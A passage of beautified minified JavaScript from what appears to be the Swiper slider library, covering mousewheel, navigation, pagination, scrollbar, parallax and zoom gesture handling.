                r = Math.abs(o.pixelX) > Math.abs(o.pixelY) ? -o.pixelX * n : -o.pixelY;
            if (0 === r)
                return !0;
            if (a.invert && (r = -r),
            s.params.freeMode) {
                s.params.loop && s.loopFix();
                var d = s.getTranslate() + r * a.sensitivity
                  , h = s.isBeginning
                  , p = s.isEnd;
                if (d >= s.minTranslate() && (d = s.minTranslate()),
                d <= s.maxTranslate() && (d = s.maxTranslate()),
                s.setTransition(0),
                s.setTranslate(d),
                s.updateProgress(),
                s.updateActiveIndex(),
                s.updateSlidesClasses(),
                (!h && s.isBeginning || !p && s.isEnd) && s.updateSlidesClasses(),
                s.params.freeModeSticky && (clearTimeout(s.mousewheel.timeout),
                s.mousewheel.timeout = l.nextTick(function() {
                    s.slideToClosest()
                }, 300)),
                s.emit("scroll", i),
                s.params.autoplay && s.params.autoplayDisableOnInteraction && s.autoplay.stop(),
                d === s.minTranslate() || d === s.maxTranslate())
                    return !0
            } else {
                if (l.now() - s.mousewheel.lastScrollTime > 60)
                    if (r < 0)
                        if (s.isEnd && !s.params.loop || s.animating) {
                            if (a.releaseOnEdges)
                                return !0
                        } else
                            s.slideNext(),
                            s.emit("scroll", i);
                    else if (s.isBeginning && !s.params.loop || s.animating) {
                        if (a.releaseOnEdges)
                            return !0
                    } else
                        s.slidePrev(),
                        s.emit("scroll", i);
                s.mousewheel.lastScrollTime = (new t.Date).getTime()
            }
            return i.preventDefault ? i.preventDefault() : i.returnValue = !1,
            !1
        },
        enable: function() {
            if (!H.event)
                return !1;
            if (this.mousewheel.enabled)
                return !1;
            var e = this.$el;
            return "container" !== this.params.mousewheel.eventsTarged && (e = s(this.params.mousewheel.eventsTarged)),
            e.on("mouseenter", this.mousewheel.handleMouseEnter),
            e.on("mouseleave", this.mousewheel.handleMouseLeave),
            e.on(H.event, this.mousewheel.handle),
            this.mousewheel.enabled = !0,
            !0
        },
        disable: function() {
            if (!H.event)
                return !1;
            if (!this.mousewheel.enabled)
                return !1;
            var e = this.$el;
            return "container" !== this.params.mousewheel.eventsTarged && (e = s(this.params.mousewheel.eventsTarged)),
            e.off(H.event, this.mousewheel.handle),
            this.mousewheel.enabled = !1,
            !0
        }
    }
      , G = {
        update: function() {
            var e = this.params.navigation;
            if (!this.params.loop) {
                var t = this.navigation
                  , i = t.$nextEl
                  , s = t.$prevEl;
                s && s.length > 0 && (this.isBeginning ? s.addClass(e.disabledClass) : s.removeClass(e.disabledClass),
                s[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](e.lockClass)),
                i && i.length > 0 && (this.isEnd ? i.addClass(e.disabledClass) : i.removeClass(e.disabledClass),
                i[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](e.lockClass))
            }
        },
        onPrevClick: function(e) {
            e.preventDefault(),
            this.isBeginning && !this.params.loop || this.slidePrev()
        },
        onNextClick: function(e) {
            e.preventDefault(),
            this.isEnd && !this.params.loop || this.slideNext()
        },
        init: function() {
            var e, t, i = this.params.navigation;
            (i.nextEl || i.prevEl) && (i.nextEl && (e = s(i.nextEl),
            this.params.uniqueNavElements && "string" == typeof i.nextEl && e.length > 1 && 1 === this.$el.find(i.nextEl).length && (e = this.$el.find(i.nextEl))),
            i.prevEl && (t = s(i.prevEl),
            this.params.uniqueNavElements && "string" == typeof i.prevEl && t.length > 1 && 1 === this.$el.find(i.prevEl).length && (t = this.$el.find(i.prevEl))),
            e && e.length > 0 && e.on("click", this.navigation.onNextClick),
            t && t.length > 0 && t.on("click", this.navigation.onPrevClick),
            l.extend(this.navigation, {
                $nextEl: e,
                nextEl: e && e[0],
                $prevEl: t,
                prevEl: t && t[0]
            }))
        },
        destroy: function() {
            var e = this.navigation
              , t = e.$nextEl
              , i = e.$prevEl;
            t && t.length && (t.off("click", this.navigation.onNextClick),
            t.removeClass(this.params.navigation.disabledClass)),
            i && i.length && (i.off("click", this.navigation.onPrevClick),
            i.removeClass(this.params.navigation.disabledClass))
        }
    }
      , N = {
        update: function() {
            var e = this.rtl
              , t = this.params.pagination;
            if (t.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var i, a = this.virtual && this.params.virtual.enabled ? this.virtual.slides.length : this.slides.length, r = this.pagination.$el, n = this.params.loop ? Math.ceil((a - 2 * this.loopedSlides) / this.params.slidesPerGroup) : this.snapGrid.length;
                if (this.params.loop ? ((i = Math.ceil((this.activeIndex - this.loopedSlides) / this.params.slidesPerGroup)) > a - 1 - 2 * this.loopedSlides && (i -= a - 2 * this.loopedSlides),
                i > n - 1 && (i -= n),
                i < 0 && "bullets" !== this.params.paginationType && (i = n + i)) : i = void 0 !== this.snapIndex ? this.snapIndex : this.activeIndex || 0,
                "bullets" === t.type && this.pagination.bullets && this.pagination.bullets.length > 0) {
                    var o, l, d, h = this.pagination.bullets;
                    if (t.dynamicBullets && (this.pagination.bulletSize = h.eq(0)[this.isHorizontal() ? "outerWidth" : "outerHeight"](!0),
                    r.css(this.isHorizontal() ? "width" : "height", this.pagination.bulletSize * (t.dynamicMainBullets + 4) + "px"),
                    t.dynamicMainBullets > 1 && void 0 !== this.previousIndex && (this.pagination.dynamicBulletIndex += i - this.previousIndex,
                    this.pagination.dynamicBulletIndex > t.dynamicMainBullets - 1 ? this.pagination.dynamicBulletIndex = t.dynamicMainBullets - 1 : this.pagination.dynamicBulletIndex < 0 && (this.pagination.dynamicBulletIndex = 0)),
                    o = i - this.pagination.dynamicBulletIndex,
                    d = ((l = o + (Math.min(h.length, t.dynamicMainBullets) - 1)) + o) / 2),
                    h.removeClass(t.bulletActiveClass + " " + t.bulletActiveClass + "-next " + t.bulletActiveClass + "-next-next " + t.bulletActiveClass + "-prev " + t.bulletActiveClass + "-prev-prev " + t.bulletActiveClass + "-main"),
                    r.length > 1)
                        h.each(function(e, a) {
                            var r = s(a)
                              , n = r.index();
                            n === i && r.addClass(t.bulletActiveClass),
                            t.dynamicBullets && (n >= o && n <= l && r.addClass(t.bulletActiveClass + "-main"),
                            n === o && r.prev().addClass(t.bulletActiveClass + "-prev").prev().addClass(t.bulletActiveClass + "-prev-prev"),
                            n === l && r.next().addClass(t.bulletActiveClass + "-next").next().addClass(t.bulletActiveClass + "-next-next"))
                        });
                    else if (h.eq(i).addClass(t.bulletActiveClass),
                    t.dynamicBullets) {
                        for (var p = h.eq(o), c = h.eq(l), u = o; u <= l; u += 1)
                            h.eq(u).addClass(t.bulletActiveClass + "-main");
                        p.prev().addClass(t.bulletActiveClass + "-prev").prev().addClass(t.bulletActiveClass + "-prev-prev"),
                        c.next().addClass(t.bulletActiveClass + "-next").next().addClass(t.bulletActiveClass + "-next-next")
                    }
                    if (t.dynamicBullets) {
                        var v = Math.min(h.length, t.dynamicMainBullets + 4)
                          , f = (this.pagination.bulletSize * v - this.pagination.bulletSize) / 2 - d * this.pagination.bulletSize
                          , m = e ? "right" : "left";
                        h.css(this.isHorizontal() ? m : "top", f + "px")
                    }
                }
                if ("fraction" === t.type && (r.find("." + t.currentClass).text(t.formatFractionCurrent(i + 1)),
                r.find("." + t.totalClass).text(t.formatFractionTotal(n))),
                "progressbar" === t.type) {
                    var g;
                    g = t.progressbarOpposite ? this.isHorizontal() ? "vertical" : "horizontal" : this.isHorizontal() ? "horizontal" : "vertical";
                    var b = (i + 1) / n
                      , w = 1
                      , y = 1;
                    "horizontal" === g ? w = b : y = b,
                    r.find("." + t.progressbarFillClass).transform("translate3d(0,0,0) scaleX(" + w + ") scaleY(" + y + ")").transition(this.params.speed)
                }
                "custom" === t.type && t.renderCustom ? (r.html(t.renderCustom(this, i + 1, n)),
                this.emit("paginationRender", this, r[0])) : this.emit("paginationUpdate", this, r[0]),
                r[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](t.lockClass)
            }
        },
        render: function() {
            var e = this.params.pagination;
            if (e.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var t = this.virtual && this.params.virtual.enabled ? this.virtual.slides.length : this.slides.length
                  , i = this.pagination.$el
                  , s = "";
                if ("bullets" === e.type) {
                    for (var a = this.params.loop ? Math.ceil((t - 2 * this.loopedSlides) / this.params.slidesPerGroup) : this.snapGrid.length, r = 0; r < a; r += 1)
                        e.renderBullet ? s += e.renderBullet.call(this, r, e.bulletClass) : s += "<" + e.bulletElement + ' class="' + e.bulletClass + '"></' + e.bulletElement + ">";
                    i.html(s),
                    this.pagination.bullets = i.find("." + e.bulletClass)
                }
                "fraction" === e.type && (s = e.renderFraction ? e.renderFraction.call(this, e.currentClass, e.totalClass) : '<span class="' + e.currentClass + '"></span> / <span class="' + e.totalClass + '"></span>',
                i.html(s)),
                "progressbar" === e.type && (s = e.renderProgressbar ? e.renderProgressbar.call(this, e.progressbarFillClass) : '<span class="' + e.progressbarFillClass + '"></span>',
                i.html(s)),
                "custom" !== e.type && this.emit("paginationRender", this.pagination.$el[0])
            }
        },
        init: function() {
            var e = this
              , t = e.params.pagination;
            if (t.el) {
                var i = s(t.el);
                0 !== i.length && (e.params.uniqueNavElements && "string" == typeof t.el && i.length > 1 && 1 === e.$el.find(t.el).length && (i = e.$el.find(t.el)),
                "bullets" === t.type && t.clickable && i.addClass(t.clickableClass),
                i.addClass(t.modifierClass + t.type),
                "bullets" === t.type && t.dynamicBullets && (i.addClass("" + t.modifierClass + t.type + "-dynamic"),
                e.pagination.dynamicBulletIndex = 0,
                t.dynamicMainBullets < 1 && (t.dynamicMainBullets = 1)),
                "progressbar" === t.type && t.progressbarOpposite && i.addClass(t.progressbarOppositeClass),
                t.clickable && i.on("click", "." + t.bulletClass, function(t) {
                    t.preventDefault();
                    var i = s(this).index() * e.params.slidesPerGroup;
                    e.params.loop && (i += e.loopedSlides),
                    e.slideTo(i)
                }),
                l.extend(e.pagination, {
                    $el: i,
                    el: i[0]
                }))
            }
        },
        destroy: function() {
            var e = this.params.pagination;
            if (e.el && this.pagination.el && this.pagination.$el && 0 !== this.pagination.$el.length) {
                var t = this.pagination.$el;
                t.removeClass(e.hiddenClass),
                t.removeClass(e.modifierClass + e.type),
                this.pagination.bullets && this.pagination.bullets.removeClass(e.bulletActiveClass),
                e.clickable && t.off("click", "." + e.bulletClass)
            }
        }
    }
      , B = {
        setTranslate: function() {
            if (this.params.scrollbar.el && this.scrollbar.el) {
                var e = this.scrollbar
                  , t = this.rtlTranslate
                  , i = this.progress
                  , s = e.dragSize
                  , a = e.trackSize
                  , r = e.$dragEl
                  , n = e.$el
                  , o = this.params.scrollbar
                  , l = s
                  , h = (a - s) * i;
                t ? (h = -h) > 0 ? (l = s - h,
                h = 0) : -h + s > a && (l = a + h) : h < 0 ? (l = s + h,
                h = 0) : h + s > a && (l = a - h),
                this.isHorizontal() ? (d.transforms3d ? r.transform("translate3d(" + h + "px, 0, 0)") : r.transform("translateX(" + h + "px)"),
                r[0].style.width = l + "px") : (d.transforms3d ? r.transform("translate3d(0px, " + h + "px, 0)") : r.transform("translateY(" + h + "px)"),
                r[0].style.height = l + "px"),
                o.hide && (clearTimeout(this.scrollbar.timeout),
                n[0].style.opacity = 1,
                this.scrollbar.timeout = setTimeout(function() {
                    n[0].style.opacity = 0,
                    n.transition(400)
                }, 1e3))
            }
        },
        setTransition: function(e) {
            this.params.scrollbar.el && this.scrollbar.el && this.scrollbar.$dragEl.transition(e)
        },
        updateSize: function() {
            if (this.params.scrollbar.el && this.scrollbar.el) {
                var e = this.scrollbar
                  , t = e.$dragEl
                  , i = e.$el;
                t[0].style.width = "",
                t[0].style.height = "";
                var s, a = this.isHorizontal() ? i[0].offsetWidth : i[0].offsetHeight, r = this.size / this.virtualSize, n = r * (a / this.size);
                s = "auto" === this.params.scrollbar.dragSize ? a * r : parseInt(this.params.scrollbar.dragSize, 10),
                this.isHorizontal() ? t[0].style.width = s + "px" : t[0].style.height = s + "px",
                i[0].style.display = r >= 1 ? "none" : "",
                this.params.scrollbar.hide && (i[0].style.opacity = 0),
                l.extend(e, {
                    trackSize: a,
                    divider: r,
                    moveDivider: n,
                    dragSize: s
                }),
                e.$el[this.params.watchOverflow && this.isLocked ? "addClass" : "removeClass"](this.params.scrollbar.lockClass)
            }
        },
        getPointerPosition: function(e) {
            return this.isHorizontal() ? "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX || e.clientX : "touchstart" === e.type || "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY || e.clientY
        },
        setDragPosition: function(e) {
            var t, i = this.scrollbar, s = this.rtlTranslate, a = i.$el, r = i.dragSize, n = i.trackSize, o = i.dragStartPos;
            t = (i.getPointerPosition(e) - a.offset()[this.isHorizontal() ? "left" : "top"] - (null !== o ? o : r / 2)) / (n - r),
            t = Math.max(Math.min(t, 1), 0),
            s && (t = 1 - t);
            var l = this.minTranslate() + (this.maxTranslate() - this.minTranslate()) * t;
            this.updateProgress(l),
            this.setTranslate(l),
            this.updateActiveIndex(),
            this.updateSlidesClasses()
        },
        onDragStart: function(e) {
            var t = this.params.scrollbar
              , i = this.scrollbar
              , s = this.$wrapperEl
              , a = i.$el
              , r = i.$dragEl;
            this.scrollbar.isTouched = !0,
            this.scrollbar.dragStartPos = e.target === r[0] || e.target === r ? i.getPointerPosition(e) - e.target.getBoundingClientRect()[this.isHorizontal() ? "left" : "top"] : null,
            e.preventDefault(),
            e.stopPropagation(),
            s.transition(100),
            r.transition(100),
            i.setDragPosition(e),
            clearTimeout(this.scrollbar.dragTimeout),
            a.transition(0),
            t.hide && a.css("opacity", 1),
            this.emit("scrollbarDragStart", e)
        },
        onDragMove: function(e) {
            var t = this.scrollbar
              , i = this.$wrapperEl
              , s = t.$el
              , a = t.$dragEl;
            this.scrollbar.isTouched && (e.preventDefault ? e.preventDefault() : e.returnValue = !1,
            t.setDragPosition(e),
            i.transition(0),
            s.transition(0),
            a.transition(0),
            this.emit("scrollbarDragMove", e))
        },
        onDragEnd: function(e) {
            var t = this.params.scrollbar
              , i = this.scrollbar.$el;
            this.scrollbar.isTouched && (this.scrollbar.isTouched = !1,
            t.hide && (clearTimeout(this.scrollbar.dragTimeout),
            this.scrollbar.dragTimeout = l.nextTick(function() {
                i.css("opacity", 0),
                i.transition(400)
            }, 1e3)),
            this.emit("scrollbarDragEnd", e),
            t.snapOnRelease && this.slideToClosest())
        },
        enableDraggable: function() {
            if (this.params.scrollbar.el) {
                var t = this.scrollbar
                  , i = this.touchEventsTouch
                  , s = this.touchEventsDesktop
                  , a = this.params
                  , r = t.$el[0]
                  , n = !(!d.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                }
                  , o = !(!d.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                };
                d.touch ? (r.addEventListener(i.start, this.scrollbar.onDragStart, n),
                r.addEventListener(i.move, this.scrollbar.onDragMove, n),
                r.addEventListener(i.end, this.scrollbar.onDragEnd, o)) : (r.addEventListener(s.start, this.scrollbar.onDragStart, n),
                e.addEventListener(s.move, this.scrollbar.onDragMove, n),
                e.addEventListener(s.end, this.scrollbar.onDragEnd, o))
            }
        },
        disableDraggable: function() {
            if (this.params.scrollbar.el) {
                var t = this.scrollbar
                  , i = this.touchEventsTouch
                  , s = this.touchEventsDesktop
                  , a = this.params
                  , r = t.$el[0]
                  , n = !(!d.passiveListener || !a.passiveListeners) && {
                    passive: !1,
                    capture: !1
                }
                  , o = !(!d.passiveListener || !a.passiveListeners) && {
                    passive: !0,
                    capture: !1
                };
                d.touch ? (r.removeEventListener(i.start, this.scrollbar.onDragStart, n),
                r.removeEventListener(i.move, this.scrollbar.onDragMove, n),
                r.removeEventListener(i.end, this.scrollbar.onDragEnd, o)) : (r.removeEventListener(s.start, this.scrollbar.onDragStart, n),
                e.removeEventListener(s.move, this.scrollbar.onDragMove, n),
                e.removeEventListener(s.end, this.scrollbar.onDragEnd, o))
            }
        },
        init: function() {
            if (this.params.scrollbar.el) {
                var e = this.scrollbar
                  , t = this.$el
                  , i = this.params.scrollbar
                  , a = s(i.el);
                this.params.uniqueNavElements && "string" == typeof i.el && a.length > 1 && 1 === t.find(i.el).length && (a = t.find(i.el));
                var r = a.find("." + this.params.scrollbar.dragClass);
                0 === r.length && (r = s('<div class="' + this.params.scrollbar.dragClass + '"></div>'),
                a.append(r)),
                l.extend(e, {
                    $el: a,
                    el: a[0],
                    $dragEl: r,
                    dragEl: r[0]
                }),
                i.draggable && e.enableDraggable()
            }
        },
        destroy: function() {
            this.scrollbar.disableDraggable()
        }
    }
      , X = {
        setTransform: function(e, t) {
            var i = this.rtl
              , a = s(e)
              , r = i ? -1 : 1
              , n = a.attr("data-swiper-parallax") || "0"
              , o = a.attr("data-swiper-parallax-x")
              , l = a.attr("data-swiper-parallax-y")
              , d = a.attr("data-swiper-parallax-scale")
              , h = a.attr("data-swiper-parallax-opacity");
            if (o || l ? (o = o || "0",
            l = l || "0") : this.isHorizontal() ? (o = n,
            l = "0") : (l = n,
            o = "0"),
            o = o.indexOf("%") >= 0 ? parseInt(o, 10) * t * r + "%" : o * t * r + "px",
            l = l.indexOf("%") >= 0 ? parseInt(l, 10) * t + "%" : l * t + "px",
            null != h) {
                var p = h - (h - 1) * (1 - Math.abs(t));
                a[0].style.opacity = p
            }
            if (null == d)
                a.transform("translate3d(" + o + ", " + l + ", 0px)");
            else {
                var c = d - (d - 1) * (1 - Math.abs(t));
                a.transform("translate3d(" + o + ", " + l + ", 0px) scale(" + c + ")")
            }
        },
        setTranslate: function() {
            var e = this
              , t = e.$el
              , i = e.slides
              , a = e.progress
              , r = e.snapGrid;
            t.children("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function(t, i) {
                e.parallax.setTransform(i, a)
            }),
            i.each(function(t, i) {
                var n = i.progress;
                e.params.slidesPerGroup > 1 && "auto" !== e.params.slidesPerView && (n += Math.ceil(t / 2) - a * (r.length - 1)),
                n = Math.min(Math.max(n, -1), 1),
                s(i).find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function(t, i) {
                    e.parallax.setTransform(i, n)
                })
            })
        },
        setTransition: function(e) {
            void 0 === e && (e = this.params.speed);
            this.$el.find("[data-swiper-parallax], [data-swiper-parallax-x], [data-swiper-parallax-y], [data-swiper-parallax-opacity], [data-swiper-parallax-scale]").each(function(t, i) {
                var a = s(i)
                  , r = parseInt(a.attr("data-swiper-parallax-duration"), 10) || e;
                0 === e && (r = 0),
                a.transition(r)
            })
        }
    }
      , V = {
        getDistanceBetweenTouches: function(e) {
            if (e.targetTouches.length < 2)
                return 1;
            var t = e.targetTouches[0].pageX
              , i = e.targetTouches[0].pageY
              , s = e.targetTouches[1].pageX
              , a = e.targetTouches[1].pageY;
            return Math.sqrt(Math.pow(s - t, 2) + Math.pow(a - i, 2))
        },
        onGestureStart: function(e) {
            var t = this.params.zoom
              , i = this.zoom
              , a = i.gesture;
            if (i.fakeGestureTouched = !1,
            i.fakeGestureMoved = !1,
            !d.gestures) {
                if ("touchstart" !== e.type || "touchstart" === e.type && e.targetTouches.length < 2)
                    return;
                i.fakeGestureTouched = !0,
                a.scaleStart = V.getDistanceBetweenTouches(e)
            }
            a.$slideEl && a.$slideEl.length || (a.$slideEl = s(e.target).closest(".swiper-slide"),
            0 === a.$slideEl.length && (a.$slideEl = this.slides.eq(this.activeIndex)),
            a.$imageEl = a.$slideEl.find("img, svg, canvas"),
            a.$imageWrapEl = a.$imageEl.parent("." + t.containerClass),
            a.maxRatio = a.$imageWrapEl.attr("data-swiper-zoom") || t.maxRatio,
            0 !== a.$imageWrapEl.length) ? (a.$imageEl.transition(0),
            this.zoom.isScaling = !0) : a.$imageEl = void 0
        },
        onGestureChange: function(e) {
            var t = this.params.zoom
              , i = this.zoom
              , s = i.gesture;
            if (!d.gestures) {
                if ("touchmove" !== e.type || "touchmove" === e.type && e.targetTouches.length < 2)
                    return;
                i.fakeGestureMoved = !0,
                s.scaleMove = V.getDistanceBetweenTouches(e)
            }
            s.$imageEl && 0 !== s.$imageEl.length && (d.gestures ? i.scale = e.scale * i.currentScale : i.scale = s.scaleMove / s.scaleStart * i.currentScale,
            i.scale > s.maxRatio && (i.scale = s.maxRatio - 1 + Math.pow(i.scale - s.maxRatio + 1, .5)),
            i.scale < t.minRatio && (i.scale = t.minRatio + 1 - Math.pow(t.minRatio - i.scale + 1, .5)),
            s.$imageEl.transform("translate3d(0,0,0) scale(" + i.scale + ")"))
        },
        onGestureEnd: function(e) {
            var t = this.params.zoom
              , i = this.zoom
              , s = i.gesture;
            if (!d.gestures) {
                if (!i.fakeGestureTouched || !i.fakeGestureMoved)
                    return;
                if ("touchend" !== e.type || "touchend" === e.type && e.changedTouches.length < 2 && !y.android)
                    return;
                i.fakeGestureTouched = !1,
                i.fakeGestureMoved = !1
            }
            s.$imageEl && 0 !== s.$imageEl.length && (i.scale = Math.max(Math.min(i.scale, s.maxRatio), t.minRatio),
            s.$imageEl.transition(this.params.speed).transform("translate3d(0,0,0) scale(" + i.scale + ")"),
            i.currentScale = i.scale,
            i.isScaling = !1,
            1 === i.scale && (s.$slideEl = void 0))
        },
        onTouchStart: function(e) {
            var t = this.zoom
              , i = t.gesture
              , s = t.image;
            i.$imageEl && 0 !== i.$imageEl.length && (s.isTouched || (y.android && e.preventDefault(),
            s.isTouched = !0,
            s.touchesStart.x = "touchstart" === e.type ? e.targetTouches[0].pageX : e.pageX,
            s.touchesStart.y = "touchstart" === e.type ? e.targetTouches[0].pageY : e.pageY))
        },
        onTouchMove: function(e) {
            var t = this.zoom
              , i = t.gesture
              , s = t.image
              , a = t.velocity;
            if (i.$imageEl && 0 !== i.$imageEl.length && (this.allowClick = !1,
            s.isTouched && i.$slideEl)) {
                s.isMoved || (s.width = i.$imageEl[0].offsetWidth,
                s.height = i.$imageEl[0].offsetHeight,
                s.startX = l.getTranslate(i.$imageWrapEl[0], "x") || 0,
                s.startY = l.getTranslate(i.$imageWrapEl[0], "y") || 0,
                i.slideWidth = i.$slideEl[0].offsetWidth,
                i.slideHeight = i.$slideEl[0].offsetHeight,
                i.$imageWrapEl.transition(0),
                this.rtl && (s.startX = -s.startX,
                s.startY = -s.startY));
                var r = s.width * t.scale
                  , n = s.height * t.scale;
                if (!(r < i.slideWidth && n < i.slideHeight)) {
                    if (s.minX = Math.min(i.slideWidth / 2 - r / 2, 0),
                    s.maxX = -s.minX,
                    s.minY = Math.min(i.slideHeight / 2 - n / 2, 0),
                    s.maxY = -s.minY,
                    s.touchesCurrent.x = "touchmove" === e.type ? e.targetTouches[0].pageX : e.pageX,
                    s.touchesCurrent.y = "touchmove" === e.type ? e.targetTouches[0].pageY : e.pageY,
                    !s.isMoved && !t.isScaling) {
                        if (this.isHorizontal() && (Math.floor(s.minX) === Math.floor(s.startX) && s.touchesCurrent.x < s.touchesStart.x || Math.floor(s.maxX) === Math.floor(s.startX) && s.touchesCurrent.x > s.touchesStart.x))
                            return void (s.isTouched = !1);
                        if (!this.isHorizontal() && (Math.floor(s.minY) === Math.floor(s.startY) && s.touchesCurrent.y < s.touchesStart.y || Math.floor(s.maxY) === Math.floor(s.startY) && s.touchesCurrent.y > s.touchesStart.y))
                            return void (s.isTouched = !1)
                    }
                    e.preventDefault(),
                    e.stopPropagation(),
                    s.isMoved = !0,
                    s.currentX = s.touchesCurrent.x - s.touchesStart.x + s.startX,
                    s.currentY = s.touchesCurrent.y - s.touchesStart.y + s.startY,
                    s.currentX < s.minX && (s.currentX = s.minX + 1 - Math.pow(s.minX - s.currentX + 1, .8)),
                    s.currentX > s.maxX && (s.currentX = s.maxX - 1 + Math.pow(s.currentX - s.maxX + 1, .8)),
                    s.currentY < s.minY && (s.currentY = s.minY + 1 - Math.pow(s.minY - s.currentY + 1, .8)),
                    s.currentY > s.maxY && (s.currentY = s.maxY - 1 + Math.pow(s.currentY - s.maxY + 1, .8)),
                    a.prevPositionX || (a.prevPositionX = s.touchesCurrent.x),
                    a.prevPositionY || (a.prevPositionY = s.touchesCurrent.y),
                    a.prevTime || (a.prevTime = Date.now()),
                    a.x = (s.touchesCurrent.x - a.prevPositionX) / (Date.now() - a.prevTime) / 2,
                    a.y = (s.touchesCurrent.y - a.prevPositionY) / (Date.now() - a.prevTime) / 2,
                    Math.abs(s.touchesCurrent.x - a.prevPositionX) < 2 && (a.x = 0),
                    Math.abs(s.touchesCurrent.y - a.prevPositionY) < 2 && (a.y = 0),
                    a.prevPositionX = s.touchesCurrent.x,
                    a.prevPositionY = s.touchesCurrent.y,
                    a.prevTime = Date.now(),
                    i.$imageWrapEl.transform("translate3d(" + s.currentX + "px, " + s.currentY + "px,0)")
                }
            }
        },
        onTouchEnd: function() {
            var e = this.zoom
              , t = e.gesture
              , i = e.image
              , s = e.velocity;
            if (t.$imageEl && 0 !== t.$imageEl.length) {
                if (!i.isTouched || !i.isMoved)
                    return i.isTouched = !1,
                    void (i.isMoved = !1);
                i.isTouched = !1,
                i.isMoved = !1;
                var a = 300
                  , r = 300
                  , n = s.x * a
                  , o = i.currentX + n
                  , l = s.y * r
                  , d = i.currentY + l;
                0 !== s.x && (a = Math.abs((o - i.currentX) / s.x)),
                0 !== s.y && (r = Math.abs((d - i.currentY) / s.y));
                var h = Math.max(a, r);
                i.currentX = o,
                i.currentY = d;
                var p = i.width * e.scale
                  , c = i.height * e.scale;
                i.minX = Math.min(t.slideWidth / 2 - p / 2, 0),
                i.maxX = -i.minX,
                i.minY = Math.min(t.slideHeight / 2 - c / 2, 0),
                i.maxY = -i.minY,
                i.currentX = Math.max(Math.min(i.currentX, i.maxX), i.minX),
                i.currentY = Math.max(Math.min(i.currentY, i.maxY), i.minY),
                t.$imageWrapEl.transition(h).transform("translate3d(" + i.currentX + "px, " + i.currentY + "px,0)")
            }
        },
        onTransitionEnd: function() {
            var e = this.zoom
              , t = e.gesture;
            t.$slideEl && this.previousIndex !== this.activeIndex && (t.$imageEl.transform("translate3d(0,0,0) scale(1)"),
            t.$imageWrapEl.transform("translate3d(0,0,0)"),
            e.scale = 1,
            e.currentScale = 1,
            t.$slideEl = void 0,
            t.$imageEl = void 0,
            t.$imageWrapEl = void 0)
        },
        toggle: function(e) {
            var t = this.zoom;
            t.scale && 1 !== t.scale ? t.out() : t.in(e)
        },
        in: function(e) {
            var t, i, a, r, n, o, l, d, h, p, c, u, v, f, m, g, b = this.zoom, w = this.params.zoom, y = b.gesture, x = b.image;
            (y.$slideEl || (y.$slideEl = this.clickedSlide ? s(this.clickedSlide) : this.slides.eq(this.activeIndex),
            y.$imageEl = y.$slideEl.find("img, svg, canvas"),
            y.$imageWrapEl = y.$imageEl.parent("." + w.containerClass)),
            y.$imageEl && 0 !== y.$imageEl.length) && (y.$slideEl.addClass("" + w.zoomedSlideClass),
            void 0 === x.touchesStart.x && e ? (t = "touchend" === e.type ? e.changedTouches[0].pageX : e.pageX,
            i = "touchend" === e.type ? e.changedTouches[0].pageY : e.pageY) : (t = x.touchesStart.x,
            i = x.touchesStart.y),
            b.scale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio,
            b.currentScale = y.$imageWrapEl.attr("data-swiper-zoom") || w.maxRatio,
            e ? (m = y.$slideEl[0].offsetWidth,
            g = y.$slideEl[0].offsetHeight,
            a = y.$slideEl.offset().left + m / 2 - t,
            r = y.$slideEl.offset().top + g / 2 - i,
            l = y.$imageEl[0].offsetWidth,
            d = y.$imageEl[0].offsetHeight,
            h = l * b.scale,
            p = d * b.scale,
            v = -(c = Math.min(m / 2 - h / 2, 0)),
            f = -(u = Math.min(g / 2 - p / 2, 0)),
            (n = a * b.scale) < c && (n = c),
            n > v && (n = v),
            (o = r * b.scale) < u && (o = u),
            o > f && (o = f)) : (n = 0,
            o = 0),
            y.$imageWrapEl.transition(300).transform("translate3d(" + n + "px, " + o + "px,0)"),
            y.$imageEl.transition(300).transform("translate3d(0,0,0) scale(" + b.scale + ")"))
        },
        out: function() {
            var e = this.zoom
              , t = this.params.zoom
              , i = e.gesture;
            i.$slideEl || (i.$slideEl = this.clickedSlide ? s(this.clickedSlide) : this.slides.eq(this.activeIndex),
            i.$imageEl = i.$slideEl.find("img, svg, canvas"),
            i.$imageWrapEl = i.$imageEl.parent("." + t.containerClass)),
            i.$imageEl && 0 !== i.$imageEl.length && (e.scale = 1,
            e.currentScale = 1,
            i.$imageWrapEl.transition(300).transform("translate3d(0,0,0)"),
            i.$imageEl.transition(300).transform("translate3d(0,0,0) scale(1)"),
            i.$slideEl.removeClass("" + t.zoomedSlideClass),
            i.$slideEl = void 0)
        },
        enable: function() {
            var e = this.zoom;
            if (!e.enabled) {
                e.enabled = !0;
                var t = !("touchstart" !== this.touchEvents.start || !d.passiveListener || !this.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                };
                d.gestures ? (this.$wrapperEl.on("gesturestart", ".swiper-slide", e.onGestureStart, t),
                this.$wrapperEl.on("gesturechange", ".swiper-slide", e.onGestureChange, t),
                this.$wrapperEl.on("gestureend", ".swiper-slide", e.onGestureEnd, t)) : "touchstart" === this.touchEvents.start && (this.$wrapperEl.on(this.touchEvents.start, ".swiper-slide", e.onGestureStart, t),
                this.$wrapperEl.on(this.touchEvents.move, ".swiper-slide", e.onGestureChange, t),
                this.$wrapperEl.on(this.touchEvents.end, ".swiper-slide", e.onGestureEnd, t)),
                this.$wrapperEl.on(this.touchEvents.move, "." + this.params.zoom.containerClass, e.onTouchMove)
            }
        },
        disable: function() {
            var e = this.zoom;
            if (e.enabled) {
                this.zoom.enabled = !1;
                var t = !("touchstart" !== this.touchEvents.start || !d.passiveListener || !this.params.passiveListeners) && {
                    passive: !0,
                    capture: !1
                };
